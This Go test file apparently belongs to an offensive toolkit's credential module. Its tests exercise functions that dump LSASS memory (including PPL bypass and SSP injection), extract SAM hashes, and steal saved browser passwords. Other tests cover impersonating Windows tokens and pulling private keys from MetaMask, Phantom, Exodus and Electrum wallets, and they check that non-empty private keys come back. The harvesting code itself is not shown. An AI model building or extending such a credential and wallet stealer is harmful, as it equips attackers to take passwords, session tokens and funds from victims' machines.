package credential

import (
	"testing"
	"time"

	"github.com/angel-platform/angel/pkg/types"
)

func TestNewCredentialEngine(t *testing.T) {
	config := DefaultCredentialConfig()
	engine := NewCredentialEngine(config)

	if engine == nil {
		t.Fatal("engine should not be nil")
	}

	if engine.config == nil {
		t.Fatal("config should not be nil")
	}

	if engine.log == nil {
		t.Fatal("logger should not be nil")
	}
}

func TestNewCredentialEngineNilConfig(t *testing.T) {
	engine := NewCredentialEngine(nil)

	if engine == nil {
		t.Fatal("engine should not be nil")
	}

	if engine.config == nil {
		t.Fatal("config should not be nil after nil config passed")
	}
}

func TestHarvestLSASS(t *testing.T) {
	config := DefaultCredentialConfig()
	config.LSASSMethods = []LSASSMethod{LSASSMiniDump}
	engine := NewCredentialEngine(config)

	creds, err := engine.Harvest(string(CategoryLSASS))
	if err != nil {
		t.Fatalf("harvest failed: %v", err)
	}

	if len(creds) == 0 {
		t.Fatal("expected at least one credential")
	}

	for _, cred := range creds {
		if cred.Type == "" {
			t.Error("credential type should not be empty")
		}
		if cred.Username == "" {
			t.Error("credential username should not be empty")
		}
	}
}

func TestHarvestSAM(t *testing.T) {
	config := DefaultCredentialConfig()
	config.SAMMethods = []SAMMethod{SAMRegistryDump}
	engine := NewCredentialEngine(config)

	creds, err := engine.Harvest(string(CategorySAM))
	if err != nil {
		t.Fatalf("harvest failed: %v", err)
	}

	if len(creds) == 0 {
		t.Fatal("expected at least one credential")
	}

	for _, cred := range creds {
		if cred.Type == "" {
			t.Error("credential type should not be empty")
		}
	}
}

func TestHarvestBrowser(t *testing.T) {
	config := DefaultCredentialConfig()
	config.Browsers = []BrowserType{BrowserChrome}
	engine := NewCredentialEngine(config)

	creds, err := engine.Harvest(string(CategoryBrowser))
	if err != nil {
		t.Fatalf("harvest failed: %v", err)
	}

	if len(creds) == 0 {
		t.Fatal("expected at least one credential")
	}

	for _, cred := range creds {
		if cred.Type == "" {
			t.Error("credential type should not be empty")
		}
	}
}

func TestHarvestToken(t *testing.T) {
	config := DefaultCredentialConfig()
	config.TokenMethods = []TokenMethod{TokenImpersonation}
	engine := NewCredentialEngine(config)

	creds, err := engine.Harvest(string(CategoryToken))
	if err != nil {
		t.Fatalf("harvest failed: %v", err)
	}

	if len(creds) == 0 {
		t.Fatal("expected at least one credential")
	}

	for _, cred := range creds {
		if cred.Type == "" {
			t.Error("credential type should not be empty")
		}
	}
}

func TestHarvestUnknownCategory(t *testing.T) {
	config := DefaultCredentialConfig()
	engine := NewCredentialEngine(config)

	_, err := engine.Harvest("unknown")
	if err == nil {
		t.Fatal("expected error for unknown category")
	}
}

func TestDumpLSASS(t *testing.T) {
	config := DefaultCredentialConfig()
	config.LSASSMethods = []LSASSMethod{LSASSMiniDump}
	engine := NewCredentialEngine(config)

	creds, err := engine.DumpLSASS()
	if err != nil {
		t.Fatalf("DumpLSASS failed: %v", err)
	}

	if len(creds) == 0 {
		t.Fatal("expected at least one credential")
	}
}

func TestExtractBrowser(t *testing.T) {
	config := DefaultCredentialConfig()
	config.Browsers = []BrowserType{BrowserChrome}
	engine := NewCredentialEngine(config)

	creds, err := engine.ExtractBrowser(BrowserChrome)
	if err != nil {
		t.Fatalf("ExtractBrowser failed: %v", err)
	}

	if len(creds) == 0 {
		t.Fatal("expected at least one credential")
	}
}

func TestExtractBrowserUnsupported(t *testing.T) {
	config := DefaultCredentialConfig()
	engine := NewCredentialEngine(config)

	_, err := engine.ExtractBrowser(BrowserType("unsupported"))
	if err == nil {
		t.Fatal("expected error for unsupported browser")
	}
}

func TestExtractSAM(t *testing.T) {
	config := DefaultCredentialConfig()
	config.SAMMethods = []SAMMethod{SAMRegistryDump}
	engine := NewCredentialEngine(config)

	creds, err := engine.ExtractSAM()
	if err != nil {
		t.Fatalf("ExtractSAM failed: %v", err)
	}

	if len(creds) == 0 {
		t.Fatal("expected at least one credential")
	}
}

func TestExtractWalletKeys(t *testing.T) {
	config := DefaultCredentialConfig()
	config.WalletTypes = []WalletType{WalletMetaMask}
	engine := NewCredentialEngine(config)

	keys, err := engine.ExtractWalletKeys(WalletMetaMask)
	if err != nil {
		t.Fatalf("ExtractWalletKeys failed: %v", err)
	}

	if len(keys) == 0 {
		t.Fatal("expected at least one wallet key")
	}

	for _, key := range keys {
		if key.Address == "" {
			t.Error("wallet address should not be empty")
		}
		if key.PrivateKey == "" {
			t.Error("wallet private key should not be empty")
		}
	}
}

func TestHarvestAll(t *testing.T) {
	config := DefaultCredentialConfig()
	engine := NewCredentialEngine(config)

	harvest, err := engine.HarvestAll()
	if err != nil {
		t.Fatalf("HarvestAll failed: %v", err)
	}

	if harvest == nil {
		t.Fatal("harvest should not be nil")
	}

	if harvest.Timestamp.IsZero() {
		t.Error("harvest timestamp should be set")
	}
}

func TestGetHarvested(t *testing.T) {
	config := DefaultCredentialConfig()
	engine := NewCredentialEngine(config)

	_, err := engine.Harvest(string(CategoryLSASS))
	if err != nil {
		t.Fatalf("harvest failed: %v", err)
	}

	harvested := engine.GetHarvested()
	if len(harvested) == 0 {
		t.Fatal("expected at least one harvest")
	}
}

func TestLSASSExtractorNames(t *testing.T) {
	extractors := []LSASSExtractor{
		NewForkDumpExtractor(),
		NewMiniDumpExtractor(),
		NewProcDumpExtractor(),
		NewNanoDumpExtractor(),
		NewPPLBypassExtractor(),
		NewSSPInjectionExtractor(),
		NewHookingExtractor(),
	}

	expectedNames := []string{
		"ForkDump", "MiniDump", "ProcDump", "NanoDump",
		"PPLBypass", "SSPInjection", "Hooking",
	}

	for i, ext := range extractors {
		if ext.Name() != expectedNames[i] {
			t.Errorf("expected name %s, got %s", expectedNames[i], ext.Name())
		}
	}
}

func TestSAMExtractorNames(t *testing.T) {
	extractors := []SAMExtractor{
		NewRegistryDumpExtractor(),
		NewHiveExtractExtractor(),
		NewVSSExtractExtractor(),
	}

	expectedNames := []string{"RegistryDump", "HiveExtract", "VSSExtract"}

	for i, ext := range extractors {
		if ext.Name() != expectedNames[i] {
			t.Errorf("expected name %s, got %s", expectedNames[i], ext.Name())
		}
	}
}

func TestBrowserExtractorNames(t *testing.T) {
	extractors := []BrowserExtractor{
		NewChromeExtractor(),
		NewFirefoxExtractor(),
		NewEdgeExtractor(),
		NewBraveExtractor(),
		NewOperaExtractor(),
	}

	expectedNames := []string{"Chrome", "Firefox", "Edge", "Brave", "Opera"}

	for i, ext := range extractors {
		if ext.Name() != expectedNames[i] {
			t.Errorf("expected name %s, got %s", expectedNames[i], ext.Name())
		}
	}
}

func TestWalletExtractorNames(t *testing.T) {
	extractors := []WalletExtractor{
		NewMetaMaskExtractor(),
		NewPhantomExtractor(),
		NewExodusExtractor(),
		NewElectrumExtractor(),
	}

	expectedNames := []string{"MetaMask", "Phantom", "Exodus", "Electrum"}

	for i, ext := range extractors {
		if ext.Name() != expectedNames[i] {
			t.Errorf("expected name %s, got %s", expectedNames[i], ext.Name())
		}
	}
}

func TestTokenThiefNames(t *testing.T) {
	thieves := []TokenThief{
		NewTokenImpersonationThief(),
		NewTokenDelegationThief(),
		NewTokenPrimaryThief(),
	}

	expectedNames := []string{"TokenImpersonation", "TokenDelegation", "TokenPrimary"}

	for i, thief := range thieves {
		if thief.Name() != expectedNames[i] {
			t.Errorf("expected name %s, got %s", expectedNames[i], thief.Name())
		}
	}
}

func TestDefaultCredentialConfig(t *testing.T) {
	config := DefaultCredentialConfig()

	if config == nil {
		t.Fatal("config should not be nil")
	}

	if config.Platform != types.PlatformWindows {
		t.Errorf("expected platform windows, got %s", config.Platform)
	}

	if len(config.Categories) == 0 {
		t.Error("expected at least one category")
	}

	if config.Timeout != 60*time.Second {
		t.Errorf("expected timeout 60s, got %v", config.Timeout)
	}
}

func TestValidateLSASSMethod(t *testing.T) {
	if err := validateLSASSMethod(LSASSMiniDump); err != nil {
		t.Errorf("MiniDump should be valid: %v", err)
	}

	if err := validateLSASSMethod("invalid"); err == nil {
		t.Error("expected error for invalid method")
	}
}

func TestValidateSAMMethod(t *testing.T) {
	if err := validateSAMMethod(SAMRegistryDump); err != nil {
		t.Errorf("RegistryDump should be valid: %v", err)
	}

	if err := validateSAMMethod("invalid"); err == nil {
		t.Error("expected error for invalid method")
	}
}

func TestValidateBrowserType(t *testing.T) {
	if err := validateBrowserType(BrowserChrome); err != nil {
		t.Errorf("Chrome should be valid: %v", err)
	}

	if err := validateBrowserType("invalid"); err == nil {
		t.Error("expected error for invalid browser type")
	}
}

func TestValidateWalletType(t *testing.T) {
	if err := validateWalletType(WalletMetaMask); err != nil {
		t.Errorf("MetaMask should be valid: %v", err)
	}

	if err := validateWalletType("invalid"); err == nil {
		t.Error("expected error for invalid wallet type")
	}
}

func TestValidateTokenMethod(t *testing.T) {
	if err := validateTokenMethod(TokenImpersonation); err != nil {
		t.Errorf("TokenImpersonation should be valid: %v", err)
	}

	if err := validateTokenMethod("invalid"); err == nil {
		t.Error("expected error for invalid token method")
	}
}

func TestCredentialResultTimestamps(t *testing.T) {
	config := DefaultCredentialConfig()
	config.LSASSMethods = []LSASSMethod{LSASSMiniDump}
	config.SAMMethods = []SAMMethod{SAMRegistryDump}
	config.Browsers = []BrowserType{BrowserChrome}
	config.TokenMethods = []TokenMethod{TokenImpersonation}
	engine := NewCredentialEngine(config)

	creds, err := engine.Harvest(string(CategoryLSASS))
	if err != nil {
		t.Fatalf("harvest failed: %v", err)
	}

	for _, cred := range creds {
		if cred.Timestamp.IsZero() {
			t.Error("credential timestamp should be set")
		}
	}
}
